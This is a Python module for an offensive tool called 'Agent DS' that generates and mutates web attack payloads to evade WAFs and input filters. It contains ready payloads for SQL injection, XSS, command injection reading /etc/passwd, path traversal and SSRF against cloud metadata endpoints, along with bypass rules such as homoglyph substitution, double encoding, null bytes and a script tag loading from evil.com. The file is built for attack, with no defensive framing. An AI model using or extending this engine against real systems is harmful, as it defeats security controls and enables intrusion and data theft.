"""
Agent DS - Advanced Payload Mutation Engine
AI-powered payload generation and mutation to bypass WAFs, filters, and security controls
"""

import asyncio
import json
import re
import base64
import urllib.parse
import hashlib
import random
import string
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass
import logging

# AI/ML imports
try:
    import torch
    import torch.nn as nn
    from transformers import GPT2LMHeadModel, GPT2Tokenizer, pipeline
    import numpy as np
except ImportError:
    torch = None
    GPT2LMHeadModel = None

from core.config.settings import Config
from core.utils.logger import get_logger

logger = get_logger('payload_mutation')

@dataclass
class PayloadTemplate:
    """Template for payload generation"""
    template_id: str
    attack_type: str
    base_payload: str
    mutation_points: List[str]
    encoding_schemes: List[str]
    evasion_techniques: List[str]
    success_history: List[bool]
    effectiveness_score: float

@dataclass
class MutationRule:
    """Rule for payload mutation"""
    rule_id: str
    rule_type: str
    pattern: str
    replacement: str
    condition: str
    priority: int
    effectiveness: float

@dataclass
class FilterBypassTechnique:
    """Technique for bypassing security filters"""
    technique_id: str
    name: str
    description: str
    implementation: str
    applicable_contexts: List[str]
    bypass_success_rate: float

class TransformerPayloadGenerator:
    """Transformer-based payload generator"""
    
    def __init__(self):
        self.logger = get_logger('transformer_generator')
        self.model = None
        self.tokenizer = None
        self.device = torch.device("cuda" if torch.cuda.is_available() else "cpu") if torch else None
        
        if torch and GPT2LMHeadModel:
            self._initialize_model()
    
    def _initialize_model(self):
        """Initialize the transformer model"""
        try:
            self.tokenizer = GPT2Tokenizer.from_pretrained('gpt2')
            self.model = GPT2LMHeadModel.from_pretrained('gpt2')
            
            # Add special tokens for security contexts
            special_tokens = {
                'pad_token': '<PAD>',
                'additional_special_tokens': [
                    '<SQL>', '<XSS>', '<CMD>', '<LFI>', '<SSRF>', '<XXE>',
                    '<SSTI>', '<DESER>', '<BYPASS>', '<ENCODE>', '<OBFUSCATE>'
                ]
            }
            
            self.tokenizer.add_special_tokens(special_tokens)
            self.model.resize_token_embeddings(len(self.tokenizer))
            
            if self.device:
                self.model.to(self.device)
            
            self.logger.info("Transformer payload generator initialized")
            
        except Exception as e:
            self.logger.error(f"Failed to initialize transformer model: {str(e)}")
            self.model = None
            self.tokenizer = None
    
    async def generate_payload(self, attack_type: str, context: Dict[str, Any],
                             base_payload: str = None, mutation_strength: float = 0.8) -> str:
        """Generate a new payload using transformer model"""
        if not self.model or not self.tokenizer:
            return self._fallback_generation(attack_type, context, base_payload)
        
        try:
            # Create input prompt for payload generation
            prompt = self._create_generation_prompt(attack_type, context, base_payload)
            
            # Tokenize input
            inputs = self.tokenizer.encode(prompt, return_tensors='pt')
            if self.device:
                inputs = inputs.to(self.device)
            
            # Generate payload
            with torch.no_grad():
                outputs = self.model.generate(
                    inputs,
                    max_length=inputs.shape[1] + 100,
                    temperature=mutation_strength,
                    do_sample=True,
                    top_p=0.9,
                    pad_token_id=self.tokenizer.pad_token_id,
                    num_return_sequences=1
                )
            
            # Decode generated payload
            generated_text = self.tokenizer.decode(outputs[0], skip_special_tokens=True)
            payload = self._extract_payload_from_generation(generated_text, prompt)
            
            return payload
            
        except Exception as e:
            self.logger.error(f"Transformer generation failed: {str(e)}")
            return self._fallback_generation(attack_type, context, base_payload)
    
    def _create_generation_prompt(self, attack_type: str, context: Dict, base_payload: str) -> str:
        """Create input prompt for payload generation"""
        attack_token = f"<{attack_type.upper()}>"
        
        prompt = f"{attack_token} Target: {context.get('target_tech', 'web_app')}"
        
        if context.get('waf_detected'):
            prompt += " WAF: detected"
        
        if context.get('filters'):
            prompt += f" Filters: {','.join(context['filters'])}"
        
        if base_payload:
            prompt += f" Base: {base_payload}"
        
        prompt += " Generate:"
        
        return prompt
    
    def _extract_payload_from_generation(self, generated_text: str, prompt: str) -> str:
        """Extract payload from generated text"""
        # Remove the prompt from the generated text
        payload_text = generated_text[len(prompt):].strip()
        
        # Extract the actual payload (first line or sentence)
        lines = payload_text.split('\n')
        payload = lines[0].strip() if lines else payload_text
        
        # Clean up the payload
        payload = payload.replace('<PAD>', '').strip()
        
        return payload if payload else self._get_default_payload()
    
    def _fallback_generation(self, attack_type: str, context: Dict, base_payload: str) -> str:
        """Fallback payload generation when transformer is not available"""
        if base_payload:
            return self._simple_mutation(base_payload, attack_type)
        else:
            return self._get_default_payload(attack_type)
    
    def _simple_mutation(self, payload: str, attack_type: str) -> str:
        """Simple payload mutation as fallback"""
        mutations = [
            lambda p: p.replace("'", "''"),
            lambda p: p.replace(" ", "/**/"),
            lambda p: urllib.parse.quote(p),
            lambda p: base64.b64encode(p.encode()).decode(),
            lambda p: p.upper() if random.random() > 0.5 else p.lower()
        ]
        
        mutation = random.choice(mutations)
        return mutation(payload)
    
    def _get_default_payload(self, attack_type: str = 'sql_injection') -> str:
        """Get default payload for attack type"""
        defaults = {
            'sql_injection': "' UNION SELECT 1,2,3--",
            'xss': '<script>alert("XSS")</script>',
            'command_injection': '; cat /etc/passwd',
            'lfi': '../../../etc/passwd',
            'ssrf': 'http://169.254.169.254/latest/meta-data/'
        }
        return defaults.get(attack_type, "test_payload")

class PayloadMutationEngine:
    """Advanced payload mutation engine with AI-powered techniques"""
    
    def __init__(self):
        self.config = Config()
        self.logger = get_logger('payload_mutation')
        self.transformer_generator = TransformerPayloadGenerator()
        
        # Initialize mutation rules and techniques
        self.mutation_rules = self._initialize_mutation_rules()
        self.bypass_techniques = self._initialize_bypass_techniques()
        self.encoding_schemes = self._initialize_encoding_schemes()
        
        # Payload templates
        self.payload_templates = self._initialize_payload_templates()
        
        # Performance tracking
        self.mutation_success_rates = {}
        self.bypass_effectiveness = {}
    
    def _initialize_mutation_rules(self) -> List[MutationRule]:
        """Initialize payload mutation rules"""
        rules = [
            # SQL Injection mutations
            MutationRule(
                rule_id="sql_comment_bypass",
                rule_type="comment_injection",
                pattern=r"--",
                replacement="/**/",
                condition="sql_injection",
                priority=8,
                effectiveness=0.7
            ),
            MutationRule(
                rule_id="sql_case_variation",
                rule_type="case_modification",
                pattern=r"UNION",
                replacement=lambda: random.choice(["union", "Union", "UNION", "uNiOn"]),
                condition="sql_injection",
                priority=6,
                effectiveness=0.6
            ),
            MutationRule(
                rule_id="sql_space_bypass",
                rule_type="whitespace_bypass",
                pattern=r" ",
                replacement=lambda: random.choice(["/**/", "+", "%20", "\t", "\n"]),
                condition="sql_injection",
                priority=7,
                effectiveness=0.8
            ),
            
            # XSS mutations
            MutationRule(
                rule_id="xss_tag_obfuscation",
                rule_type="tag_modification",
                pattern=r"<script>",
                replacement=lambda: random.choice([
                    "<script>", "<ScRiPt>", "<script >", "<%73cript>",
                    "<script/src=//evil.com>", "<svg onload=", "<img src=x onerror="
                ]),
                condition="xss",
                priority=9,
                effectiveness=0.8
            ),
            MutationRule(
                rule_id="xss_event_variation",
                rule_type="event_handler",
                pattern=r"alert\(",
                replacement=lambda: random.choice([
                    "alert(", "confirm(", "prompt(", "eval(",
                    "setTimeout(alert,1,", "window['ale'+'rt']("
                ]),
                condition="xss",
                priority=7,
                effectiveness=0.7
            ),
            
            # Command injection mutations
            MutationRule(
                rule_id="cmd_separator_variation",
                rule_type="command_separator",
                pattern=r";",
                replacement=lambda: random.choice([";", "&&", "||", "|", "&", "\n"]),
                condition="command_injection",
                priority=8,
                effectiveness=0.9
            ),
            MutationRule(
                rule_id="cmd_quote_bypass",
                rule_type="quote_bypass",
                pattern=r"cat /etc/passwd",
                replacement=lambda: random.choice([
                    "cat /etc/passwd", "cat /etc/pas*", "cat /e*c/pass*",
                    "ca''t /etc/passwd", 'ca""t /etc/passwd', "cat /etc/pa\\sswd"
                ]),
                condition="command_injection",
                priority=6,
                effectiveness=0.6
            ),
            
            # File inclusion mutations
            MutationRule(
                rule_id="lfi_encoding_bypass",
                rule_type="path_encoding",
                pattern=r"\.\./",
                replacement=lambda: random.choice([
                    "../", "..\\", "....//", "..%2f", "..%5c", "%2e%2e%2f"
                ]),
                condition="file_inclusion",
                priority=8,
                effectiveness=0.8
            ),
            
            # SSRF mutations
            MutationRule(
                rule_id="ssrf_ip_encoding",
                rule_type="ip_obfuscation",
                pattern=r"127\.0\.0\.1",
                replacement=lambda: random.choice([
                    "127.0.0.1", "localhost", "0x7f000001", "2130706433",
                    "127.1", "0177.0.0.1", "127.0.0.1.nip.io"
                ]),
                condition="ssrf",
                priority=9,
                effectiveness=0.9
            )
        ]
        
        return rules
    
    def _initialize_bypass_techniques(self) -> List[FilterBypassTechnique]:
        """Initialize filter bypass techniques"""
        techniques = [
            FilterBypassTechnique(
                technique_id="waf_case_variation",
                name="Case Variation",
                description="Vary character case to bypass case-sensitive filters",
                implementation="random_case_variation",
                applicable_contexts=["sql_injection", "xss", "command_injection"],
                bypass_success_rate=0.6
            ),
            FilterBypassTechnique(
                technique_id="waf_encoding_bypass",
                name="Encoding Bypass",
                description="Use various encoding schemes to evade detection",
                implementation="multi_encoding",
                applicable_contexts=["all"],
                bypass_success_rate=0.8
            ),
            FilterBypassTechnique(
                technique_id="waf_comment_injection",
                name="Comment Injection",
                description="Insert comments to break payload signatures",
                implementation="comment_insertion",
                applicable_contexts=["sql_injection", "xss"],
                bypass_success_rate=0.7
            ),
            FilterBypassTechnique(
                technique_id="waf_concatenation",
                name="String Concatenation",
                description="Break strings using concatenation techniques",
                implementation="string_concat",
                applicable_contexts=["sql_injection", "xss"],
                bypass_success_rate=0.7
            ),
            FilterBypassTechnique(
                technique_id="waf_unicode_bypass",
                name="Unicode Bypass",
                description="Use Unicode normalization and homoglyphs",
                implementation="unicode_normalization",
                applicable_contexts=["xss", "command_injection"],
                bypass_success_rate=0.5
            ),
            FilterBypassTechnique(
                technique_id="waf_null_byte",
                name="Null Byte Injection",
                description="Use null bytes to terminate string processing",
                implementation="null_byte_insertion",
                applicable_contexts=["file_inclusion", "command_injection"],
                bypass_success_rate=0.4
            ),
            FilterBypassTechnique(
                technique_id="waf_double_encoding",
                name="Double Encoding",
                description="Apply multiple layers of encoding",
                implementation="recursive_encoding",
                applicable_contexts=["all"],
                bypass_success_rate=0.6
            ),
            FilterBypassTechnique(
                technique_id="waf_chunked_payload",
                name="Payload Chunking",
                description="Split payload across multiple parameters",
                implementation="payload_chunking",
                applicable_contexts=["sql_injection", "xss"],
                bypass_success_rate=0.8
            )
        ]
        
        return techniques
    
    def _initialize_encoding_schemes(self) -> Dict[str, callable]:
        """Initialize encoding schemes for payload obfuscation"""
        return {
            'url_encode': lambda s: urllib.parse.quote(s),
            'double_url_encode': lambda s: urllib.parse.quote(urllib.parse.quote(s)),
            'html_encode': lambda s: ''.join(f'&#x{ord(c):x};' for c in s),
            'base64_encode': lambda s: base64.b64encode(s.encode()).decode(),
            'hex_encode': lambda s: ''.join(f'\\x{ord(c):02x}' for c in s),
            'unicode_encode': lambda s: ''.join(f'\\u{ord(c):04x}' for c in s),
            'char_code_encode': lambda s: f"String.fromCharCode({','.join(str(ord(c)) for c in s)})",
            'octal_encode': lambda s: ''.join(f'\\{ord(c):03o}' for c in s)
        }
    
    def _initialize_payload_templates(self) -> Dict[str, List[PayloadTemplate]]:
        """Initialize payload templates for different attack types"""
        templates = {
            'sql_injection': [
                PayloadTemplate(
                    template_id="sql_union_basic",
                    attack_type="sql_injection",
                    base_payload="' UNION SELECT {columns}--",
                    mutation_points=["columns", "comment_style"],
                    encoding_schemes=["url_encode", "hex_encode"],
                    evasion_techniques=["case_variation", "comment_injection"],
                    success_history=[],
                    effectiveness_score=0.8
                ),
                PayloadTemplate(
                    template_id="sql_boolean_blind",
                    attack_type="sql_injection",
                    base_payload="' AND {condition}--",
                    mutation_points=["condition", "logical_operator"],
                    encoding_schemes=["url_encode"],
                    evasion_techniques=["space_bypass", "case_variation"],
                    success_history=[],
                    effectiveness_score=0.7
                ),
                PayloadTemplate(
                    template_id="sql_time_blind",
                    attack_type="sql_injection",
                    base_payload="'; WAITFOR DELAY '{delay}'--",
                    mutation_points=["delay", "time_function"],
                    encoding_schemes=["url_encode"],
                    evasion_techniques=["comment_injection"],
                    success_history=[],
                    effectiveness_score=0.9
                )
            ],
            'xss': [
                PayloadTemplate(
                    template_id="xss_script_basic",
                    attack_type="xss",
                    base_payload="<script>{javascript}</script>",
                    mutation_points=["javascript", "tag_attributes"],
                    encoding_schemes=["html_encode", "unicode_encode"],
                    evasion_techniques=["tag_obfuscation", "event_variation"],
                    success_history=[],
                    effectiveness_score=0.7
                ),
                PayloadTemplate(
                    template_id="xss_event_handler",
                    attack_type="xss",
                    base_payload="<{tag} {event}={payload}>",
                    mutation_points=["tag", "event", "payload"],
                    encoding_schemes=["html_encode", "char_code_encode"],
                    evasion_techniques=["tag_obfuscation"],
                    success_history=[],
                    effectiveness_score=0.8
                ),
                PayloadTemplate(
                    template_id="xss_dom_based",
                    attack_type="xss",
                    base_payload="javascript:{payload}",
                    mutation_points=["payload"],
                    encoding_schemes=["url_encode", "unicode_encode"],
                    evasion_techniques=["concatenation"],
                    success_history=[],
                    effectiveness_score=0.6
                )
            ],
            'command_injection': [
                PayloadTemplate(
                    template_id="cmd_basic_injection",
                    attack_type="command_injection",
                    base_payload="{separator} {command}",
                    mutation_points=["separator", "command"],
                    encoding_schemes=["url_encode"],
                    evasion_techniques=["separator_variation", "quote_bypass"],
                    success_history=[],
                    effectiveness_score=0.8
                ),
                PayloadTemplate(
                    template_id="cmd_blind_injection",
                    attack_type="command_injection",
                    base_payload="{separator} {command} > /dev/null",
                    mutation_points=["separator", "command"],
                    encoding_schemes=["url_encode"],
                    evasion_techniques=["quote_bypass"],
                    success_history=[],
                    effectiveness_score=0.7
                )
            ],
            'file_inclusion': [
                PayloadTemplate(
                    template_id="lfi_traversal",
                    attack_type="file_inclusion",
                    base_payload="{traversal}{file}",
                    mutation_points=["traversal", "file"],
                    encoding_schemes=["url_encode", "double_url_encode"],
                    evasion_techniques=["encoding_bypass", "null_byte"],
                    success_history=[],
                    effectiveness_score=0.7
                ),
                PayloadTemplate(
                    template_id="lfi_wrapper",
                    attack_type="file_inclusion",
                    base_payload="php://filter/read=convert.base64-encode/resource={file}",
                    mutation_points=["file"],
                    encoding_schemes=["url_encode"],
                    evasion_techniques=["encoding_bypass"],
                    success_history=[],
                    effectiveness_score=0.9
                )
            ],
            'ssrf': [
                PayloadTemplate(
                    template_id="ssrf_cloud_metadata",
                    attack_type="ssrf",
                    base_payload="http://{target}/latest/meta-data/",
                    mutation_points=["target"],
                    encoding_schemes=["url_encode"],
                    evasion_techniques=["ip_encoding"],
                    success_history=[],
                    effectiveness_score=0.8
                ),
                PayloadTemplate(
                    template_id="ssrf_internal_service",
                    attack_type="ssrf",
                    base_payload="http://{internal_ip}:{port}/{path}",
                    mutation_points=["internal_ip", "port", "path"],
                    encoding_schemes=["url_encode"],
                    evasion_techniques=["ip_encoding"],
                    success_history=[],
                    effectiveness_score=0.7
                )
            ]
        }
        
        return templates
    
    async def generate_mutated_payload(self, attack_type: str, base_payload: str,
                                     target_context: Dict[str, Any],
                                     mutation_intensity: float = 0.8) -> str:
        """Generate a mutated payload with advanced techniques"""
        try:
            # Start with base payload
            current_payload = base_payload
            
            # Apply AI-powered generation if available
            if mutation_intensity > 0.7:
                ai_payload = await self.transformer_generator.generate_payload(
                    attack_type, target_context, base_payload, mutation_intensity
                )
                if ai_payload and len(ai_payload) > 10:
                    current_payload = ai_payload
            
            # Apply mutation rules
            current_payload = self._apply_mutation_rules(current_payload, attack_type)
            
            # Apply bypass techniques based on context
            current_payload = await self._apply_bypass_techniques(
                current_payload, attack_type, target_context
            )
            
            # Apply encoding if needed
            if target_context.get('requires_encoding', False):
                current_payload = self._apply_encoding(current_payload, target_context)
            
            # Final obfuscation layer
            if mutation_intensity > 0.9:
                current_payload = self._apply_advanced_obfuscation(current_payload, attack_type)
            
            self.logger.info(f"Generated mutated payload: {current_payload[:100]}...")
            
            return current_payload
            
        except Exception as e:
            self.logger.error(f"Payload mutation failed: {str(e)}")
            return base_payload
    
    def _apply_mutation_rules(self, payload: str, attack_type: str) -> str:
        """Apply relevant mutation rules to payload"""
        applicable_rules = [
            rule for rule in self.mutation_rules
            if rule.condition == attack_type or rule.condition == "all"
        ]
        
        # Sort by priority and effectiveness
        applicable_rules.sort(key=lambda r: (r.priority, r.effectiveness), reverse=True)
        
        mutated_payload = payload
        
        for rule in applicable_rules[:3]:  # Apply top 3 rules
            try:
                if isinstance(rule.replacement, str):
                    mutated_payload = re.sub(rule.pattern, rule.replacement, mutated_payload)
                elif callable(rule.replacement):
                    mutated_payload = re.sub(rule.pattern, rule.replacement(), mutated_payload)
            except Exception as e:
                self.logger.warning(f"Failed to apply rule {rule.rule_id}: {str(e)}")
        
        return mutated_payload
    
    async def _apply_bypass_techniques(self, payload: str, attack_type: str,
                                     context: Dict[str, Any]) -> str:
        """Apply bypass techniques based on context"""
        mutated_payload = payload
        
        # Detect security measures from context
        security_measures = context.get('security_measures', [])
        waf_detected = context.get('waf_detected', False)
        
        if waf_detected or 'waf' in security_measures:
            # Apply WAF bypass techniques
            mutated_payload = self._apply_waf_bypass(mutated_payload, attack_type)
        
        if 'input_filter' in security_measures:
            # Apply input filter bypass
            mutated_payload = self._apply_input_filter_bypass(mutated_payload, attack_type)
        
        if 'content_filter' in security_measures:
            # Apply content filter bypass
            mutated_payload = self._apply_content_filter_bypass(mutated_payload, attack_type)
        
        return mutated_payload
    
    def _apply_waf_bypass(self, payload: str, attack_type: str) -> str:
        """Apply WAF-specific bypass techniques"""
        waf_bypass_techniques = [
            self._case_variation,
            self._comment_injection,
            self._string_concatenation,
            self._unicode_normalization
        ]
        
        # Apply 2-3 random techniques
        selected_techniques = random.sample(waf_bypass_techniques, 
                                          min(3, len(waf_bypass_techniques)))
        
        mutated_payload = payload
        for technique in selected_techniques:
            try:
                mutated_payload = technique(mutated_payload, attack_type)
            except Exception as e:
                self.logger.warning(f"WAF bypass technique failed: {str(e)}")
        
        return mutated_payload
    
    def _case_variation(self, payload: str, attack_type: str) -> str:
        """Apply random case variation"""
        if attack_type in ['sql_injection', 'xss']:
            # Vary case of SQL/HTML keywords
            keywords = ['UNION', 'SELECT', 'FROM', 'WHERE', 'AND', 'OR', 'script', 'alert', 'onload']
            for keyword in keywords:
                if keyword.lower() in payload.lower():
                    variations = [keyword.lower(), keyword.upper(), keyword.capitalize()]
                    variation = random.choice(variations)
                    payload = re.sub(re.escape(keyword), variation, payload, flags=re.IGNORECASE)
        
        return payload
    
    def _comment_injection(self, payload: str, attack_type: str) -> str:
        """Inject comments to break signatures"""
        if attack_type == 'sql_injection':
            # Insert SQL comments
            comment_styles = ['/**/', '/*comment*/', '--', '#']
            comment = random.choice(comment_styles)
            
            # Insert comment at strategic positions
            if 'UNION' in payload.upper():
                payload = payload.replace('UNION', f'UNI{comment}ON')
            if 'SELECT' in payload.upper():
                payload = payload.replace('SELECT', f'SEL{comment}ECT')
        
        elif attack_type == 'xss':
            # Insert HTML comments
            if '<script>' in payload.lower():
                payload = payload.replace('<script>', '<!----><script>')
        
        return payload
    
    def _string_concatenation(self, payload: str, attack_type: str) -> str:
        """Break strings using concatenation"""
        if attack_type == 'sql_injection':
            # SQL string concatenation
            if "'" in payload:
                payload = payload.replace("'admin'", "'ad'+'min'")
                payload = payload.replace("'1'", "'1'")
        
        elif attack_type == 'xss':
            # JavaScript string concatenation
            if 'alert(' in payload:
                payload = payload.replace('alert(', "ale"+"rt(")
        
        return payload
    
    def _unicode_normalization(self, payload: str, attack_type: str) -> str:
        """Apply Unicode normalization techniques"""
        # Replace some ASCII characters with Unicode equivalents
        unicode_replacements = {
            'a': 'а',  # Cyrillic a
            'o': 'о',  # Cyrillic o
            'p': 'р',  # Cyrillic p
            'c': 'с',  # Cyrillic c
            'e': 'е',  # Cyrillic e
        }
        
        mutated_payload = payload
        for ascii_char, unicode_char in unicode_replacements.items():
            if random.random() < 0.3:  # 30% chance to replace each character
                mutated_payload = mutated_payload.replace(ascii_char, unicode_char)
        
        return mutated_payload
    
    def _apply_input_filter_bypass(self, payload: str, attack_type: str) -> str:
        """Apply input filter bypass techniques"""
        # Double encoding
        if random.random() < 0.5:
            payload = urllib.parse.quote(urllib.parse.quote(payload))
        
        # Null byte injection
        if attack_type in ['file_inclusion', 'command_injection']:
            if random.random() < 0.3:
                payload += '%00'
        
        return payload
    
    def _apply_content_filter_bypass(self, payload: str, attack_type: str) -> str:
        """Apply content filter bypass techniques"""
        if attack_type == 'xss':
            # Alternative XSS vectors
            xss_alternatives = [
                '<svg onload=alert(1)>',
                '<img src=x onerror=alert(1)>',
                '<body onload=alert(1)>',
                'javascript:alert(1)',
                '<iframe src="javascript:alert(1)"></iframe>'
            ]
            
            if '<script>' in payload.lower():
                if random.random() < 0.4:
                    alternative = random.choice(xss_alternatives)
                    payload = alternative
        
        return payload
    
    def _apply_encoding(self, payload: str, context: Dict[str, Any]) -> str:
        """Apply encoding based on context requirements"""
        encoding_type = context.get('encoding_type', 'url_encode')
        
        if encoding_type in self.encoding_schemes:
            encoder = self.encoding_schemes[encoding_type]
            return encoder(payload)
        
        return payload
    
    def _apply_advanced_obfuscation(self, payload: str, attack_type: str) -> str:
        """Apply advanced obfuscation techniques"""
        if attack_type == 'javascript' or 'script' in payload.lower():
            # JavaScript obfuscation
            payload = self._obfuscate_javascript(payload)
        
        elif attack_type == 'sql_injection':
            # SQL obfuscation
            payload = self._obfuscate_sql(payload)
        
        return payload
    
    def _obfuscate_javascript(self, payload: str) -> str:
        """Obfuscate JavaScript code"""
        # String splitting and reconstruction
        if 'alert(' in payload:
            payload = payload.replace('alert', 'window["ale"+"rt"]')
        
        # Variable name obfuscation
        if 'var ' in payload:
            var_name = ''.join(random.choices(string.ascii_letters, k=8))
            payload = payload.replace('var x', f'var {var_name}')
        
        return payload
    
    def _obfuscate_sql(self, payload: str) -> str:
        """Obfuscate SQL code"""
        # Hex encoding of strings
        if "'" in payload:
            # Convert string literals to hex
            pattern = r"'([^']+)'"
            
            def hex_replace(match):
                string_val = match.group(1)
                hex_val = ''.join(f'{ord(c):02x}' for c in string_val)
                return f"0x{hex_val}"
            
            payload = re.sub(pattern, hex_replace, payload)
        
        return payload
    
    async def evaluate_payload_effectiveness(self, payload: str, attack_type: str,
                                           test_result: Dict[str, Any]) -> float:
        """Evaluate the effectiveness of a mutated payload"""
        effectiveness_score = 0.0
        
        # Base success score
        if test_result.get('success', False):
            effectiveness_score += 0.5
        
        # Stealth score (low detection probability)
        detection_prob = test_result.get('detection_probability', 0.5)
        stealth_score = max(0, 1 - detection_prob) * 0.3
        effectiveness_score += stealth_score
        
        # Innovation score (novel technique)
        if test_result.get('novel_technique', False):
            effectiveness_score += 0.2
        
        # Efficiency score (fast execution)
        response_time = test_result.get('response_time', 5.0)
        if response_time < 3.0:
            effectiveness_score += 0.1
        
        # Update mutation success rates
        mutation_id = hashlib.md5(payload.encode()).hexdigest()
        if mutation_id not in self.mutation_success_rates:
            self.mutation_success_rates[mutation_id] = []
        
        self.mutation_success_rates[mutation_id].append(effectiveness_score)
        
        return min(effectiveness_score, 1.0)
    
    def get_top_performing_mutations(self, attack_type: str, limit: int = 10) -> List[Dict]:
        """Get top performing mutations for an attack type"""
        # This would query the database for historical performance
        # For now, return mock data
        return [
            {
                'mutation_id': 'sql_hex_encoding',
                'attack_type': 'sql_injection',
                'success_rate': 0.85,
                'stealth_score': 0.7,
                'usage_count': 45
            },
            {
                'mutation_id': 'xss_unicode_bypass',
                'attack_type': 'xss',
                'success_rate': 0.72,
                'stealth_score': 0.8,
                'usage_count': 32
            }
        ]
    
    def adaptive_mutation_selection(self, attack_type: str, context: Dict[str, Any]) -> List[str]:
        """Adaptively select mutation techniques based on context and history"""
        # Analyze context to determine best mutations
        selected_techniques = []
        
        # WAF detected - prioritize evasion techniques
        if context.get('waf_detected', False):
            selected_techniques.extend([
                'case_variation', 'comment_injection', 'encoding_bypass'
            ])
        
        # High security environment - use advanced techniques
        if context.get('security_level', 'medium') == 'high':
            selected_techniques.extend([
                'unicode_normalization', 'double_encoding', 'chunked_payload'
            ])
        
        # Previous failures - try different approaches
        if context.get('previous_failures', 0) > 3:
            selected_techniques.extend([
                'advanced_obfuscation', 'concatenation', 'alternative_vectors'
            ])
        
        return list(set(selected_techniques))  # Remove duplicates